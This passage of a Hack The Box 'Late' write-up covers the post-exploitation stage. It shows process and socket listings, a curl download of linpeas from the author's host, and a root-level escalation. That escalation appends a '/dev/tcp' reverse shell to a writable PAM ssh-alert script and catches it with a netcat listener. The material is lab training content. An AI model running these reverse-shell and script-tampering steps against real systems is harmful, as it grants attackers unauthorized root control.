tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1199/python3        
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:57672           0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::38142                :::*                                -                   
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     13241    -                    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     69690    4127/systemd         /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     69694    4127/systemd         /run/user/1000/bus
unix  2      [ ACC ]     STREAM     LISTENING     69695    4127/systemd         /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     69696    4127/systemd         /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     69697    4127/systemd         /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     69698    4127/systemd         /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     69699    4127/systemd         /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     18890    -                    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     18896    -                    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     18899    -                    /run/avahi-daemon/socket
unix  2      [ ACC ]     STREAM     LISTENING     19707    -                    @irqbalance1028.sock
unix  2      [ ACC ]     STREAM     LISTENING     18888    -                    /var/lib/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     23236    -                    /var/run/sendmail/mta/smcontrol
unix  2      [ ACC ]     STREAM     LISTENING     17267    -                    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     18881    -                    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     14462    -                    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     14473    -                    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     13228    -                    /run/lvm/lvmetad.socket
unix  2      [ ACC ]     STREAM     LISTENING     13238    -                    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     18882    -                    /run/acpid.socket
</span></pre></table></code></div></div><h3 id="process"><span class="mr-2">Process</span><a href="#process" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
</pre><td class="rouge-code"><pre><span class="go">ps aux

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 159576  8776 ?        Ss   18:36   0:03 /sbin/init maybe-ubiquity
root         2  0.0  0.0      0     0 ?        S    18:36   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    18:36   0:00 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    18:36   0:02 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    18:36   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    18:36   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    18:36   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    18:36   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    18:36   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    18:36   0:00 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    18:36   0:00 [migration/1]
root        16  0.0  0.0      0     0 ?        S    18:36   0:00 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    18:36   0:00 [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [netns]
root        21  0.0  0.0      0     0 ?        S    18:36   0:00 [rcu_tasks_kthre]
root        22  0.0  0.0      0     0 ?        S    18:36   0:00 [kauditd]
root        23  0.0  0.0      0     0 ?        I    18:36   0:00 [kworker/0:1]
root        24  0.0  0.0      0     0 ?        S    18:36   0:00 [khungtaskd]
root        25  0.0  0.0      0     0 ?        S    18:36   0:00 [oom_reaper]
root        26  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [writeback]
root        27  0.0  0.0      0     0 ?        S    18:36   0:00 [kcompactd0]
root        28  0.0  0.0      0     0 ?        SN   18:36   0:00 [ksmd]
root        29  0.0  0.0      0     0 ?        SN   18:36   0:00 [khugepaged]
root        30  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [crypto]
root        31  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kintegrityd]
root        32  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kblockd]
root        33  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ata_sff]
root        34  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [md]
root        35  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [edac-poller]
root        36  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [devfreq_wq]
root        37  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [watchdogd]
root        41  0.0  0.0      0     0 ?        S    18:36   0:00 [kswapd0]
root        42  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kworker/u5:0]
root        43  0.0  0.0      0     0 ?        S    18:36   0:00 [ecryptfs-kthrea]
root        85  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kthrotld]
root        86  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [acpi_thermal_pm]
root        87  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_0]
root        88  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_0]
root        89  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_1]
root        90  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_1]
root        96  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ipv6_addrconf]
root       105  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kstrp]
root       122  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [charger_manager]
root       124  0.0  0.0      0     0 ?        I    18:36   0:00 [kworker/0:2]
root       173  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_2]
root       174  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_2]
root       175  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_3]
root       176  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_3]
root       177  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_4]
root       178  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ttm_swap]
root       179  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_4]
root       180  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_5]
root       181  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_5]
root       182  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_6]
root       183  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_6]
root       184  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_7]
root       185  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_7]
root       186  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_8]
root       187  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_8]
root       188  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_9]
root       189  0.0  0.0      0     0 ?        S    18:36   0:00 [irq/16-vmwgfx]
root       190  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_9]
root       191  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_10]
root       192  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_10]
root       193  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_11]
root       194  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [mpt_poll_0]
root       195  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [mpt/0]
root       196  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_11]
root       197  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_12]
root       198  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_12]
root       199  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_13]
root       200  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_13]
root       201  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_14]
root       202  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_14]
root       203  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_15]
root       204  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_15]
root       205  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_16]
root       206  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_16]
root       207  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_17]
root       212  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_17]
root       216  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_18]
root       221  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_18]
root       223  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_19]
root       226  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_19]
root       231  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_20]
root       232  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_20]
root       233  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_21]
root       248  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_21]
root       250  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_22]
root       251  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_22]
root       253  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_23]
root       254  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_23]
root       255  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_24]
root       256  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_24]
root       257  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_25]
root       259  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_25]
root       260  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_26]
root       261  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_26]
root       262  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_27]
root       263  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_27]
root       264  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_28]
root       265  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_28]
root       266  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_29]
root       268  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_29]
root       269  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_30]
root       270  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_30]
root       271  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_31]
root       272  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_31]
root       310  0.0  0.0      0     0 ?        S    18:36   0:00 [scsi_eh_32]
root       311  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [scsi_tmf_32]
root       313  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kworker/1:1H]
root       316  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kworker/0:1H]
root       322  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kdmflush]
root       323  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [bioset]
root       324  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [kdmflush]
root       326  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [bioset]
root       403  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [raid5wq]
root       460  0.0  0.0      0     0 ?        S    18:36   0:00 [jbd2/dm-0-8]
root       461  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ext4-rsv-conver]
root       538  0.0  0.5 127716 11080 ?        S&lt;s  18:36   0:00 /lib/systemd/systemd-journald
root       539  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [iscsi_eh]
root       545  0.0  0.0 105912  1780 ?        Ss   18:36   0:00 /sbin/lvmetad -f
root       546  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ib-comp-wq]
root       547  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ib-comp-unb-wq]
root       548  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ib_mcast]
root       549  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ib_nl_sa_wq]
root       553  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [rdma_cm]
root       555  0.0  0.0      0     0 ?        I    18:36   0:04 [kworker/1:3]
root       561  0.0  0.2  46536  5080 ?        Ss   18:36   0:01 /lib/systemd/systemd-udevd
root       600  0.0  0.0      0     0 ?        S    18:36   0:00 [jbd2/sda2-8]
root       601  0.0  0.0      0     0 ?        I&lt;   18:36   0:00 [ext4-rsv-conver]
systemd+   615  0.0  0.1 145972  3224 ?        Ssl  18:36   0:00 /lib/systemd/systemd-timesyncd
root       698  0.0  0.4  89872 10020 ?        Ss   18:36   0:00 /usr/bin/VGAuthService
root       701  0.0  0.3 225736  7168 ?        S&lt;sl 18:36   0:10 /usr/bin/vmtoolsd
systemd+   838  0.0  0.2  71732  5060 ?        Ss   18:36   0:00 /lib/systemd/systemd-networkd
systemd+   855  0.0  0.2  70500  4984 ?        Ss   18:36   0:00 /lib/systemd/systemd-resolved
root      1007  0.0  0.0  95548  1560 ?        Ssl  18:36   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root      1008  0.0  0.4 434328  9640 ?        Ssl  18:36   0:00 /usr/sbin/ModemManager --filter-policy=strict
syslog    1013  0.0  0.2 263044  4336 ?        Ssl  18:36   0:00 /usr/sbin/rsyslogd -n
daemon    1016  0.0  0.1  28340  2468 ?        Ss   18:36   0:00 /usr/sbin/atd -f
root      1028  0.0  0.0 110556  2028 ?        Ssl  18:36   0:00 /usr/sbin/irqbalance --foreground
root      1029  0.0  0.3 286260  6716 ?        Ssl  18:36   0:00 /usr/lib/accountsservice/accounts-daemon
root      1030  0.0  0.2  70476  5936 ?        Ss   18:36   0:00 /lib/systemd/systemd-logind
root      1036  0.0  0.8 169104 17100 ?        Ssl  18:36   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
avahi     1037  0.0  0.1  47212  3780 ?        Ss   18:36   0:00 avahi-daemon: running [late.local]
root      1048  0.0  0.1  30036  3320 ?        Ss   18:36   0:00 /usr/sbin/cron -f
message+  1050  0.0  0.2  50380  4828 ?        Ss   18:36   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile -
avahi     1059  0.0  0.0  47084   340 ?        S    18:36   0:00 avahi-daemon: chroot helper
root      1104  0.0  0.7 479236 16032 ?        Ssl  18:36   0:01 /usr/sbin/NetworkManager --no-daemon
root      1105  0.0  0.2  45240  5492 ?        Ss   18:36   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root      1164  0.0  0.3 288888  6604 ?        Ssl  18:36   0:00 /usr/lib/policykit-1/polkitd --no-debug
svc_acc   1199  0.0  1.1  60704 22828 ?        Ss   18:36   0:02 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:app
</span><span class="gp">root      1245  0.0  0.0 141720  1576 ?        Ss   18:36   0:00 nginx: master process /usr/sbin/nginx -g daemon on;</span><span class="w"> </span>master_process on<span class="p">;</span>
<span class="go">www-data  1246  0.0  0.3 144016  7296 ?        S    18:36   0:00 nginx: worker process
www-data  1247  0.0  0.3 144016  7296 ?        S    18:36   0:01 nginx: worker process
root      1284  0.0  0.3  72308  6548 ?        Ss   18:36   0:00 /usr/sbin/sshd -D
root      1297  0.0  0.1  14896  2044 tty1     Ss+  18:36   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
svc_acc   1467  0.0  1.8 106596 38396 ?        S    18:36   0:04 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:app
svc_acc   1481  0.0  1.7 104864 36496 ?        S    18:36   0:04 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:app
svc_acc   1502  0.0  1.7 103740 35328 ?        S    18:36   0:03 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:app
root      1541  0.0  0.2 124836  5244 ?        Ss   18:36   0:00 sendmail: MTA: accepting connections
root      2072  0.0  0.0      0     0 ?        I    18:51   0:00 [kworker/1:0]
root      2865  0.0  0.0      0     0 ?        R    19:54   0:00 [kworker/u4:0]
root      3281  0.0  0.0      0     0 ?        I    20:26   0:00 [kworker/u4:1]
</span><span class="gp">svc_acc   4094  0.0  0.0      0     0 ?        Z    21:21   0:00 [sh] &lt;defunct&gt;</span><span class="w">
</span><span class="go">root      4122  0.0  0.3 112148  7400 ?        Ss   21:23   0:00 sshd: svc_acc [priv]
svc_acc   4127  0.0  0.3  76660  7660 ?        Ss   21:23   0:00 /lib/systemd/systemd --user
svc_acc   4128  0.0  0.1 195648  2376 ?        S    21:23   0:00 (sd-pam)
svc_acc   4147  0.0  0.1 112148  3656 ?        R    21:23   0:00 sshd: svc_acc@pts/0
svc_acc   4148  0.0  0.2  21472  5276 pts/0    Ss   21:23   0:00 -bash
svc_acc   4378  0.0  0.1  38380  3652 pts/0    R+   21:35   0:00 ps aux
</span></pre></table></code></div></div><h3 id="interesting-files"><span class="mr-2">Interesting files</span><a href="#interesting-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">find / -type f -user svc_acc 2&gt;</span>/dev/null
<span class="go">
/usr/local/sbin/ssh-alert.sh

</span></pre></table></code></div></div><h3 id="linpeas"><span class="mr-2">Linpeas</span><a href="#linpeas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In my system.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">python3 -m http.server 7890
</span></pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">mktemp -d
cd /tmp/tmp.RVkAHAuLJK
</span><span class="gp">curl http://&lt;my_ip&gt;</span>:7890/linpeas.sh <span class="nt">-o</span> linpeas.sh
<span class="go">chmod +x linpeas.sh
</span><span class="gp">./linpeas.sh &gt;</span><span class="w"> </span>linpeas.out
<span class="go">
</span></pre></table></code></div></div><h2 id="maintaining-access"><span class="mr-2">Maintaining access</span><a href="#maintaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We already have the ssh key for the userâ€¦</p><h3 id="installation"><span class="mr-2">Installation</span><a href="#installation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>No need to install anything.</p><h3 id="command-and-control"><span class="mr-2">Command and Control</span><a href="#command-and-control" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>No need to install anything.</p><h2 id="privilege-escalation--lateral-movements"><span class="mr-2">Privilege escalation / lateral movements</span><a href="#privilege-escalation--lateral-movements" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can see that the application has internal open ports that are not available to the public. Itâ€™s the teseract application converting the images.</p><p>The other point that we will check is the ssh-alert.sh file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">RECIPIENT</span><span class="o">=</span><span class="s2">"root@late.htb"</span>
<span class="nv">SUBJECT</span><span class="o">=</span><span class="s2">"Email from Server Login: SSH Alert"</span>

<span class="nv">BODY</span><span class="o">=</span><span class="s2">"
A SSH login was detected.

        User:        </span><span class="nv">$PAM_USER</span><span class="s2">
        User IP Host: </span><span class="nv">$PAM_RHOST</span><span class="s2">
        Service:     </span><span class="nv">$PAM_SERVICE</span><span class="s2">
        TTY:         </span><span class="nv">$PAM_TTY</span><span class="s2">
        Date:        </span><span class="sb">`</span><span class="nb">date</span><span class="sb">`</span><span class="s2">
        Server:      </span><span class="sb">`</span><span class="nb">uname</span> <span class="nt">-a</span><span class="sb">`</span><span class="s2">
"</span>

<span class="k">if</span> <span class="o">[</span> <span class="k">${</span><span class="nv">PAM_TYPE</span><span class="k">}</span> <span class="o">=</span> <span class="s2">"open_session"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Subject:</span><span class="k">${</span><span class="nv">SUBJECT</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">BODY</span><span class="k">}</span><span class="s2">"</span> | /usr/sbin/sendmail <span class="k">${</span><span class="nv">RECIPIENT</span><span class="k">}</span>
<span class="k">fi</span>
</pre></table></code></div></div><p>In order to escalate privileges we just need to include a reverse shell into the bash script and do a ssh login.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">echo "bash -i &gt;</span>&amp; /dev/tcp/&lt;my_ip&gt;/4321 0&gt;&amp;1<span class="s2">" &gt;&gt; /usr/local/sbin/ssh-alert.sh
</span></pre></table></code></div></div><p>And open the listener.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">nc -nlvp 4321
</span></pre></table></code></div></div><p>The user will be root and the flag can be obtained.</p><h2 id="exfiltration"><span class="mr-2">Exfiltration</span><a href="#exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="maintaining-access-1"><span class="mr-2">Maintaining access</span><a href="#maintaining-access-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Not needed as we are talking of a HTB machineâ€¦</p><h2 id="covering-tracks"><span class="mr-2">Covering tracks</span><a href="#covering-tracks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Not needed as we are talking of a HTB machineâ€¦</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/ocr/" class="post-tag no-text-decoration" >OCR</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >SSTI</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >SSH</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB%20Late%20-%20NaosInfoSec&url=https%3A%2F%2Fnaosinfosec.com%2Fposts%2Fhtb-late%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Late%20-%20NaosInfoSec&u=https%3A%2F%2Fnaosinfosec.com%2Fposts%2Fhtb-late%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fnaosinfosec.com%2Fposts%2Fhtb-late%2F&text=HTB%20Late%20-%20NaosInfoSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/useful-commands/">Useful commands</a><li><a href="/posts/htb-late/">HTB Late</a><li><a href="/posts/mongod/">Mongod</a><li><a href="/posts/nibbles-htb/">HTB Nibbles</a><li><a href="/posts/htb-responder/">HTB Responder</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/apache/">Apache</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/python-pip/">python-pip</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/a06-2021-vulnerable-and-outdated-components/">A06:2021-Vulnerable And Outdated Components</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-antique/"><div class="card-body"> <em class="small" data-ts="1659531300" data-df="ll" > Aug 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Antique</h3><div class="text-muted small"><p> Reconnaissance/Intelligence Gathering In this step we collect the target information available in public repositories or sources. We do everything passively. For HTB machines there is not much ...</p></div></div></a></div><div 